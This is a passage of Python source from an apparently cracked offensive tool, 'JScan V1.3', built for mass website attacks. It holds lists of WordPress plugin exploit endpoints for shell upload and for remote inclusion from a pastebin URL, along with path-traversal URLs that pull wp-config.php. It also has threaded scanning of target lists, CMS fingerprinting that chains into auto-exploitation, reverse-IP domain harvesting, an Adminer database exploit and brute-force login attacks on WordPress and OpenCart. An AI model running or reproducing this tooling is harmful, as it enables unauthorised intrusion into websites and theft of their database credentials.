            wp_vulns = [['/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', '"errUnknownCmd"', 'wp-file-manager'],
             [
              '/jm-ajax/upload_file/', '{"files":[]}', 'wp-job-manager'],
             [
              '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', 0, 'cherry-plugin'],
             [
              '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css', '"success":true,"message"', 'Revslider CSS Injection'],
             [
              '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=update_plugin', 'Update in progress...', 'Revslider Upload Shell'],
             [
              '/?gf_page=upload', '{"status" :', 'Gravity Forms'],
             [
              '/wp-content/plugins/formcraft/file-upload/server/content/upload.php', '{"failed":', 'formcraft'],
             [
              '/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://pastebin.com/raw/CxctTsVs', 'PHP Version ', 'Social Warfare'],
             [
              '/wp-content/plugins/easy-comment-uploads/upload-form.php', "<input type='file' name='file' id='file'", 'easy-comment-uploads'],
             [
              '/wp-content/plugins/wp-mailinglist/vendors/uploadify/upload.php', 'No file data was posted', 'wp-mailinglist'],
             [
              '/wp-content/plugins/supportboard/supportboard/include/upload.php', '["error","', 'supportboard'],
             [
              '/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/do.upload.php?form_id=abc', 'type="file" name="file_abc[]"', 'wp-ajax-form-pro'],
             [
              '/wp-admin/admin-ajax.php?action=_ning_upload_image', 'no files found', 'Adning Advertising'],
             [
              '/wp-json/wp/v2/posts', ',"link":', 'Wordpress 4.7.0 - 4.7.1 REST API']]
            DowloadConfig = [
             '/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download',
             '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
             '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
             '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
             '/wp-content/force-download.php?file=../wp-config.php',
             '/force-download.php?file=wp-config.php',
             '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
             '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
             '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
             '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
             '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
             '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
             '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
             '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
             '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
             '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
             '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
             '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
             '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
             '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php',
             '/wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php']
            thread = []
            for path in wp_vulns:
                t = Thread(target=plugin_Wordpress, args=(domain, path))
                t.start()
                thread.append(t)
                sleep(0.7)

            for j in thread:
                j.join()


def cms_detect(domain, AutoScan=False):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            try:
                Wordpress = get(('http://' + domain + '/wp-includes/js/jquery/jquery-migrate.min.js'), timeout=3, headers=headers)
                check = get(('http://' + domain + ''), timeout=3, headers=headers)
                checkJoomla = get(('http://' + domain + '/administrator/language/en-GB/en-GB.xml'), timeout=3, headers=headers)
                W = get(('http://' + domain + '/wp-includes/ID3/license.txt'), timeout=3, headers=headers)
                W2 = get(('http://' + domain + '/administrator/help/en-GB/toc.json'), timeout=3, headers=headers)
                W3 = get(('http://' + domain + '/plugins/system/debug/debug.xml'), timeout=3, headers=headers)
                try:
                    if 'getID3() by James Heinrich <info@getid3.org>' in W.text:
                        open('cms/Wordpress.txt', 'a').write('{}\n'.format(domain))
                        printDomain(domain, 'Wordpress')
                    else:
                        if '"COMPONENTS_BANNERS_BANNERS"' in W2.text:
                            open('cms/Joomla.txt', 'a').write('{}\n'.format(domain))
                            printDomain(domain, 'Joomla')
                        else:
                            if '<author>Joomla!' in W3.text:
                                open('cms/Joomla.txt', 'a').write('{}\n'.format(domain))
                                printDomain(domain, 'Joomla')
                            else:
                                if '/*! jQuery Migrate' in Wordpress.text:
                                    open('cms/Wordpress.txt', 'a').write('{}\n'.format(domain))
                                    printDomain(domain, 'Wordpress')
                                else:
                                    if '/wp-content/' in check.text:
                                        open('cms/Wordpress.txt', 'a').write('{}\n'.format(domain))
                                        printDomain(domain, 'Wordpress')
                                    else:
                                        if '/sites/default/' in check.text:
                                            open('cms/Drupal.txt', 'a').write('{}\n'.format(domain))
                                            printDomain(domain, 'Drupal')
                                        else:
                                            if 'Joomla! Project' in checkJoomla.text:
                                                open('cms/Joomla.txt', 'a').write('{}\n'.format(domain))
                                                printDomain(domain, 'Joomla')
                                            else:
                                                if 'static.squarespace' in check.text:
                                                    open('cms/squarespace.txt', 'a').write('{}\n'.format(domain))
                                                    printDomain(domain, 'squarespace')
                                                else:
                                                    if 'content="vBulletin' in check.text:
                                                        open('cms/vBulletin.txt', 'a').write('{}\n'.format(domain))
                                                        printDomain(domain, 'vBulletin')
                                                    else:
                                                        if 'blogger.com/static' in check.text:
                                                            open('cms/blogger.txt', 'a').write('{}\n'.format(domain))
                                                            printDomain(domain, 'blogger')
                                                        else:
                                                            if 'static.tumblr.com' in check.text:
                                                                open('cms/tumblr.txt', 'a').write('{}\n'.format(domain))
                                                                printDomain(domain, 'tumblr')
                                                            else:
                                                                if "id='ipbwrapper'" in check.text:
                                                                    open('cms/IPB.txt', 'a').write('{}\n'.format(domain))
                                                                    printDomain(domain, 'IPB')
                                                                else:
                                                                    if 'pull-right hidden-xs' in check.text:
                                                                        open('cms/Vanilla_Forums.txt', 'a').write('{}\n'.format(domain))
                                                                        printDomain(domain, 'Vanilla Forums')
                                                                    else:
                                                                        if 'The phpBB Group :' in check.text:
                                                                            open('cms/phpBB.txt', 'a').write('{}\n'.format(domain))
                                                                            printDomain(domain, 'phpBB')
                                                                        else:
                                                                            if 'smf_theme_url' in check.text:
                                                                                open('cms/smf.txt', 'a').write('{}\n'.format(domain))
                                                                                printDomain(domain, 'smf')
                                                                            else:
                                                                                if 'id="XenForo"' in check.text:
                                                                                    open('cms/XenForo.txt', 'a').write('{}\n'.format(domain))
                                                                                    printDomain(domain, 'XenForo')
                                                                                else:
                                                                                    if 'class="DnnModule' in check.text:
                                                                                        open('cms/DNN.txt', 'a').write('{}\n'.format(domain))
                                                                                        printDomain(domain, 'DNN')
                                                                                    else:
                                                                                        if 'content="TYPO' in check.text:
                                                                                            open('cms/TYPO.txt', 'a').write('{}\n'.format(domain))
                                                                                            printDomain(domain, 'TYPO')
                                                                                        else:
                                                                                            if 'cdn7.bigcommerce.com' in check.text:
                                                                                                open('cms/bigcommerce.txt', 'a').write('{}\n'.format(domain))
                                                                                                printDomain(domain, 'bigcommerce')
                                                                                            else:
                                                                                                if '/index.php?route=' in check.text:
                                                                                                    open('cms/OpenCart.txt', 'a').write('{}\n'.format(domain))
                                                                                                    printDomain(domain, 'OpenCart')
                                                                                                else:
                                                                                                    if '.shappify.com' in check.text:
                                                                                                        open('cms/shappify.txt', 'a').write('{}\n'.format(domain))
                                                                                                        printDomain(domain, 'shappify')
                                                                                                    else:
                                                                                                        if '/skin/frontend' in check.text:
                                                                                                            open('cms/Magento.txt', 'a').write('{}\n'.format(domain))
                                                                                                            printDomain(domain, 'Magento')
                                                                                                        else:
                                                                                                            if 'var prestashop' in check.text:
                                                                                                                open('cms/prestashop.txt', 'a').write('{}\n'.format(domain))
                                                                                                                printDomain(domain, 'prestashop')
                                                                                                            else:
                                                                                                                open('cms/unknown.txt', 'a').write('{}\n'.format(domain))
                                                                                                                printDomain(domain, 'unknown')
                except:
                    pass

            except:
                pass


def cms_detect_Autoscan(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            try:
                Wordpress = get(('http://' + domain + '/wp-includes/js/jquery/jquery-migrate.min.js'), timeout=3, headers=headers)
                check = get(('http://' + domain + ''), timeout=3, headers=headers)
                checkJoomla = get(('http://' + domain + '/administrator/language/en-GB/en-GB.xml'), timeout=3, headers=headers)
                W = get(('http://' + domain + '/wp-includes/ID3/license.txt'), timeout=3, headers=headers)
                W2 = get(('http://' + domain + '/administrator/help/en-GB/toc.json'), timeout=3, headers=headers)
                W3 = get(('http://' + domain + '/plugins/system/debug/debug.xml'), timeout=3, headers=headers)
                try:
                    if 'getID3() by James Heinrich <info@getid3.org>' in W.text:
                        open('cms/Wordpress.txt', 'a').write('{}\n'.format(domain))
                        printDomain(domain, 'Wordpress')
                        vulnScanner_wp(domain)
                    else:
                        if '"COMPONENTS_BANNERS_BANNERS"' in W2.text:
                            open('cms/Joomla.txt', 'a').write('{}\n'.format(domain))
                            printDomain(domain, 'Joomla')
                            vulnScanner_jom(domain)
                        else:
                            if '<author>Joomla!' in W3.text:
                                open('cms/Joomla.txt', 'a').write('{}\n'.format(domain))
                                printDomain(domain, 'Joomla')
                                vulnScanner_jom(domain)
                            else:
                                if '/*! jQuery Migrate' in Wordpress.text:
                                    open('cms/Wordpress.txt', 'a').write('{}\n'.format(domain))
                                    printDomain(domain, 'Wordpress')
                                    vulnScanner_wp(domain)
                                else:
                                    if '/wp-content/' in check.text:
                                        open('cms/Wordpress.txt', 'a').write('{}\n'.format(domain))
                                        printDomain(domain, 'Wordpress')
                                        vulnScanner_wp(domain)
                                    else:
                                        if '/sites/default/' in check.text:
                                            open('cms/Drupal.txt', 'a').write('{}\n'.format(domain))
                                            printDomain(domain, 'Drupal')
                                        else:
                                            if 'Joomla! Project' in checkJoomla.text:
                                                open('cms/Joomla.txt', 'a').write('{}\n'.format(domain))
                                                printDomain(domain, 'Joomla')
                                                vulnScanner_jom(domain)
                                            else:
                                                if 'static.squarespace' in check.text:
                                                    open('cms/squarespace.txt', 'a').write('{}\n'.format(domain))
                                                    printDomain(domain, 'squarespace')
                                                else:
                                                    if 'content="vBulletin' in check.text:
                                                        open('cms/vBulletin.txt', 'a').write('{}\n'.format(domain))
                                                        printDomain(domain, 'vBulletin')
                                                    else:
                                                        if 'blogger.com/static' in check.text:
                                                            open('cms/blogger.txt', 'a').write('{}\n'.format(domain))
                                                            printDomain(domain, 'blogger')
                                                        else:
                                                            if 'static.tumblr.com' in check.text:
                                                                open('cms/tumblr.txt', 'a').write('{}\n'.format(domain))
                                                                printDomain(domain, 'tumblr')
                                                            else:
                                                                if "id='ipbwrapper'" in check.text:
                                                                    open('cms/IPB.txt', 'a').write('{}\n'.format(domain))
                                                                    printDomain(domain, 'IPB')
                                                                else:
                                                                    if 'pull-right hidden-xs' in check.text:
                                                                        open('cms/Vanilla_Forums.txt', 'a').write('{}\n'.format(domain))
                                                                        printDomain(domain, 'Vanilla Forums')
                                                                    else:
                                                                        if 'The phpBB Group :' in check.text:
                                                                            open('cms/phpBB.txt', 'a').write('{}\n'.format(domain))
                                                                            printDomain(domain, 'phpBB')
                                                                        else:
                                                                            if 'smf_theme_url' in check.text:
                                                                                open('cms/smf.txt', 'a').write('{}\n'.format(domain))
                                                                                printDomain(domain, 'smf')
                                                                            else:
                                                                                if 'id="XenForo"' in check.text:
                                                                                    open('cms/XenForo.txt', 'a').write('{}\n'.format(domain))
                                                                                    printDomain(domain, 'XenForo')
                                                                                else:
                                                                                    if 'class="DnnModule' in check.text:
                                                                                        open('cms/DNN.txt', 'a').write('{}\n'.format(domain))
                                                                                        printDomain(domain, 'DNN')
                                                                                    else:
                                                                                        if 'content="TYPO' in check.text:
                                                                                            open('cms/TYPO.txt', 'a').write('{}\n'.format(domain))
                                                                                            printDomain(domain, 'TYPO')
                                                                                        else:
                                                                                            if 'cdn7.bigcommerce.com' in check.text:
                                                                                                open('cms/bigcommerce.txt', 'a').write('{}\n'.format(domain))
                                                                                                printDomain(domain, 'bigcommerce')
                                                                                            else:
                                                                                                if '/index.php?route=' in check.text:
                                                                                                    open('cms/OpenCart.txt', 'a').write('{}\n'.format(domain))
                                                                                                    printDomain(domain, 'OpenCart')
                                                                                                else:
                                                                                                    if '.shappify.com' in check.text:
                                                                                                        open('cms/shappify.txt', 'a').write('{}\n'.format(domain))
                                                                                                        printDomain(domain, 'shappify')
                                                                                                    else:
                                                                                                        if '/skin/frontend' in check.text:
                                                                                                            open('cms/Magento.txt', 'a').write('{}\n'.format(domain))
                                                                                                            printDomain(domain, 'Magento')
                                                                                                        else:
                                                                                                            if 'var prestashop' in check.text:
                                                                                                                open('cms/prestashop.txt', 'a').write('{}\n'.format(domain))
                                                                                                                printDomain(domain, 'prestashop')
                                                                                                                vulnScanner_prestashop(domain)
                                                                                                            else:
                                                                                                                open('cms/unknown.txt', 'a').write('{}\n'.format(domain))
                                                                                                                printDomain(domain, 'unknown')
                                                                                                                vulnScanner_unknown(domain)
                except:
                    pass

            except:
                pass


def ReverseIP(domain):
    try:
        return gethostbyname(domain)
    except:
        return


def Reverse_ip(ip):
    KEY = open('files/KEY.txt', 'r').read()
    domain_list = []
    try:
        Rev = ReverseIP(ip)
        if Rev == None:
            print('     {}{} {}Total Domains: {}[ 0 ]{}'.format(y, ip, w, r, w))
            return domain_list
        domains = get(('https://jex.tools/?{}={}'.format(KEY, ip)), headers=headers).text
        if 'Dead Domain' in str(domains):
            print('     {}{} {}Total Domains: {}[ 0 ]{}'.format(y, Rev, w, r, w))
            return domain_list
        if 'No Domains!' in str(domains):
            print('     {}{} {}Total Domains: {}[ 0 ]{}'.format(y, Rev, w, r, w))
            return domain_list
        if "class 'list'" in str(type(eval(domains))):
            domain_list = eval(domains)
            for i in domain_list:
                open('GrabbedSites.txt', 'a').write('{}\n'.format(i))

            print('     {}{} {}Total Domains: {}[ {} ]{}'.format(y, Rev, w, g, len(eval(domains)), w))
            return domain_list
        print('     {}{} {}Total Domains: {}[ 0 ]{}'.format(y, Rev, w, r, w))
        return domain_list
    except:
        return domain_list


def get_id():
    if 'nt' in name:
        s = str(check_output('wmic csproduct get uuid'))
        return '{}'.format(s).split('UUID')[1].replace(' ', '').split('\n')[0].replace('\\r', '').replace('\\n', '').split("'")[0]
    return 'OS PROBLEM'


def FunctionEncrypt(ID):
    if ID == 'OS PROBLEM':
        print(' JEX Works only on Windows Platform')
    else:
        STEP_ONE = b64encode(bytes('{}'.format(str(ID).split('-')[4]).encode('ascii')))
        STEP_TWO = b64encode(bytes('FuckYou'.encode('ascii')))
        FINAL = '{}'.format(STEP_ONE.decode('utf-8')[::-1] + '/' + STEP_TWO.decode('utf-8')[::-1])
        STEP_TRE = b64encode(bytes(FINAL.encode('ascii'))).decode('ascii')
        print('     For Activation SEND This KEY to t.me/JEXSeller --> {}'.format(STEP_TRE))


def banner():
    b = "\n               _  _____                                 \n              | |/ ____|    JScan V1.3 - 2021                       \n              | | (___   ___ __ _ _ __  _ __   ___ _ __ \n          _   | |\\___ \\ / __/ _` | '_ \\| '_ \\ / _ \\ '__|\n         | |__| |____) | (_| (_| | | | | | | |  __/ |   \n          \\____/|_____/ \\___\\__,_|_| |_|_| |_|\\___|_|   \n                    t.me/shelltools        \n                                        \n           [1] Reverse IP                            [ GET Domains from IP ] \n           [2] CMS Detector                          [ Detect CMS ]\n           [3] AutoScan && CMS Detector              [ Detect CMS && Scan vulnerability ]        \n           [4] MySql Database Adminer Exploit        [ reverse ip && Find Adminer && FindDataBase ]\n           [5] BruteForce ATTACK                     [ opencart, Wordpress, Joomla, VB, MyBB, etc... ]\n           Notice: Jscannerv1.3 Cracked By 1337JO\n\n    "
    print(b)
def Reverse(sites):
    p = Pool(10)
    p.map(Reverse_ip, sites)


def CMS(sites, thread=25):
    p = Pool(thread)
    p.map(cms_detect, sites)


def autoscan(sites, thread=25):
    p = Pool(thread)
    p.map(cms_detect_Autoscan, sites)


def adminerExp(sites, thread=15):
    p = Pool(thread)
    p.map(Adminer, sites)


def opencartBruteForce(sites, thread=25):
    p = Pool(thread)
    p.map(bruteForceSTART_opencart, sites)


def wpBruteForce(sites, thread=25):
    p = Pool(thread)
    p.map(bruteForceSTART_Wordpress, sites)


def main():
    while True:
        try:
            chois = input('Select: ')
            if chois == str(1):
                sites = open(input(' [Reverse_IP] List: '), 'r').read().splitlines()
                Reverse(sites)
            if chois == str(2):
                sites = open(input(' [CMS Detector] List: '), 'r').read().splitlines()
                thread = input(' [CMS Detector] Threads Default is [25]: ')
                CMS(sites, int(thread))
            if chois == str(3):
                sites = open(input(' [AutoScan] List: '), 'r').read().splitlines()
                thread = input(' [AutoScan] Threads Default is [25]: ')
                autoscan(sites, int(thread))
            if chois == str(4):
                sites = open(input(' [Adminer] List: '), 'r').read().splitlines()
                thread = input(' [AutoScan] Threads Default is [15]: ')
                adminerExp(sites, int(thread))
            if chois == str(5):
                print('------------------------------------------')
                print('1= opencart')
                print('2= Wordpress')
                print('------------------------------------------')
                print('Default Passwords ==> files/passwords.txt')
                print('------------------------------------------')
                selector = input(' [Bruteforce]: ')
                if selector == str(1):
                    sites = open(input(' [Bruteforce-opencart] List: '), 'r').read().splitlines()
                    thread = input(' [Bruteforce-opencart] Threads Default is [25]: ')
                    opencartBruteForce(sites, int(thread))
                if selector == str(2):
                    sites = open(input(' [Bruteforce-Wordpress] List: '), 'r').read().splitlines()
                    thread = input(' [Bruteforce-Wordpress] Threads Default is [25]: ')
                    wpBruteForce(sites, int(thread))
        except:
            continue
def setkey():
	import random
	try:
		req = get("https://raw.githubusercontent.com/jolicense/licensing/main/revkeys.txt").content.decode('utf-8').splitlines()
		key = random.choice(req).split(" ")[0]
		if "-" in key:
			open("files/KEY.txt","w").write(key)
		print(" SETKEY: "+key)
		sleep(1.5)
	except:
		print("Connection Failed!")
		exit()
if __name__ == '__main__':
    setkey()
    clear()
    freeze_support()
    banner()
    main()
    